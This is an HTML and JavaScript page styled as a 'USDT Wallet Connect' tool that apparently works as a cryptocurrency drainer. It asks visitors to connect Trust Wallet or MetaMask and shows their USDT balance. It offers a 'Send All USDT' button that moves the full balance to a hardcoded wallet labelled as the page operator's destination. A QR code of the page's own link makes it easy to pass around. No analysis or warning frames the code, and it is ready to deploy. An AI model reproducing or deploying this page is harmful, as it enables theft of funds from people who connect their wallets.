<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT Wallet Connect</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      text-align: center;
      padding: 30px;
    }
    h2 { color: #222; }
    #connectBtn, #sendBtn {
      margin-top: 20px;
      padding: 12px 24px;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      color: #fff;
    }
    #connectBtn { background: #007bff; }
    #sendBtn { background: #28a745; display: none; }
    #balance { margin-top: 20px; font-size: 20px; color: green; }
    #qrcodeCanvas { margin: 20px auto; }
  </style>
</head>
<body>
  <h2>Scan with Trust Wallet</h2>
  <div id="qrcodeCanvas"></div>
  <p>Or connect manually:</p>
  <button id="connectBtn">ðŸ”— Connect Wallet</button>
  <div id="balance"></div>
  <button id="sendBtn">ðŸ’¸ Send All USDT</button>

  <script>
    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum Mainnet USDT
    const yourWallet = "0x8ca2e91B86d1C566F4B65cBBa9A2DE3fcdB7FdBd"; // <-- Your destination

    const usdtAbi = [
      { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
      { constant: true, inputs: [], name: "decimals", outputs: [{ name: "", type: "uint8" }], type: "function" },
      { constant: false, inputs: [{ name: "_to", type: "address" }, { name: "_value", type: "uint256" }], name: "transfer", outputs: [{ name: "", type: "bool" }], type: "function" }
    ];

    let web3, userAddress, usdt;

    // âœ… Generate working QR code for current page
    window.addEventListener('load', () => {
      const container = document.getElementById("qrcodeCanvas");
      container.innerHTML = '';
      QRCode.toCanvas(window.location.href, { width: 220 }, function (err, canvas) {
        if (err) console.error(err);
        container.appendChild(canvas);
      });
    });

    document.getElementById("connectBtn").onclick = async function () {
      if (typeof window.ethereum === 'undefined') {
        alert("Web3 wallet not detected. Use Trust Wallet or MetaMask.");
        return;
      }

      try {
        web3 = new Web3(window.ethereum);
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];

        usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
        const rawBalance = await usdt.methods.balanceOf(userAddress).call();
        const decimals = await usdt.methods.decimals().call();
        const formatted = rawBalance / (10 ** decimals);

        document.getElementById("balance").innerText = `ðŸ’° USDT Balance: ${formatted}`;
        if (formatted > 0) document.getElementById("sendBtn").style.display = 'inline-block';
      } catch (err) {
        console.error(err);
        alert("Wallet connection failed.");
      }
    };

    document.getElementById("sendBtn").onclick = async function () {
      try {
        const balance = await usdt.methods.balanceOf(userAddress).call();
        await usdt.methods.transfer(yourWallet, balance).send({ from: userAddress });
        alert("Transfer submitted. Please approve it in your wallet.");
      } catch (err) {
        console.error(err);
        alert("Transfer cancelled or failed.");
      }
    };
  </script>
</body>
</html>
